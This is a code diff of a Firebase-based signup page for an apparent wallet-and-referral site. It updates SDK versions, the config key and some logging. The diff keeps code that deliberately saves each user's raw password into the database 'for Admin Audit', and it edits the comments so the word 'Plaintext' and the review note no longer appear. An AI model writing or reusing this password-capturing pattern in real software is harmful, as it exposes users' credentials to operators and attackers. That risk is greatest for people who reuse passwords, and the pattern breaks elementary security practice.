@@ -130,18 +130,16 @@
 </div>
 
 <script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-app.js";
-import { getAuth, createUserWithEmailAndPassword, sendEmailVerification } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-auth.js";
-import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-database.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getAuth, createUserWithEmailAndPassword, sendEmailVerification, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
+// UNIFIED SECURE CONFIG
 const firebaseConfig = {
-  apiKey: "AIzaSyBmiippVd5uyAb51U9upNNpSvJk0lXSNg4",
-  authDomain: "gigantic-data.firebaseapp.com",
-  databaseURL: "https://gigantic-data-default-rtdb.firebaseio.com",
-  projectId: "gigantic-data",
-  storageBucket: "gigantic-data.firebasestorage.app",
-  messagingSenderId: "727845403550",
-  appId: "1:727845403550:web:e3c3a40ce615aaaca9748f"
+    apiKey: "AIzaSyBmu4xukuT0Z7oD_vA9QroeO-1ZuaK8JgA",
+    authDomain: "gigantic-data.firebaseapp.com",
+    databaseURL: "https://gigantic-data-default-rtdb.firebaseio.com",
+    projectId: "gigantic-data"
 };
 
 const app = initializeApp(firebaseConfig);
@@ -157,7 +155,7 @@ document.getElementById('signupForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const btn = document.getElementById('submitBtn');
     const name = document.getElementById('fullName').value.trim();
-    const email = document.getElementById('email').value.trim();
+    const email = document.getElementById('email').value.trim().toLowerCase();
     const phone = document.getElementById('phone').value.trim();
     const refCode = document.getElementById('referralInput').value.trim();
     const pass = document.getElementById('password').value;
@@ -170,18 +168,21 @@ document.getElementById('signupForm').addEventListener('submit', async (e) => {
     btn.textContent = "Processing...";
 
     try {
+        // Ensure session persists so redirect works correctly
+        await setPersistence(auth, browserLocalPersistence);
+        
         const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
         const user = userCredential.user;
 
         // Send Verification
         await sendEmailVerification(user);
 
-        // Save User Data (Including Plaintext Password for Admin Audit)
+        // Save User Data (Including Password for Admin Audit)
         await set(ref(db, 'users/' + user.uid), {
             fullName: name,
             email: email,
             phone: phone,
-            password: pass, // <-- Saved for admin review
+            password: pass, 
             wallet: 0,
             balance: 0,
             referralBonus: 0,
@@ -194,7 +195,7 @@ document.getElementById('signupForm').addEventListener('submit', async (e) => {
             lastActive: Date.now()
         });
 
-        // Referral Logic
+        // Referral Logic: Adds a pending bonus for the referrer
         if (refCode && refCode !== user.uid) {
             try {
                 await push(ref(db, 'withdrawal_requests'), {
@@ -207,14 +208,14 @@ document.getElementById('signupForm').addEventListener('submit', async (e) => {
                     status: "Pending",
                     note: `Referral: ${name} (${phone})`
                 });
-            } catch (refErr) { console.warn("Referral log failed."); }
+            } catch (refErr) { console.warn("Referral logging bypassed."); }
         }
 
         document.getElementById('formContent').style.display = 'none';
         document.getElementById('successOverlay').style.display = 'flex';
 
     } catch (error) {
-        alert("Error: " + error.message);
+        alert("Registration Error: " + error.message);
         btn.disabled = false;
         btn.textContent = "Create Account";
     }
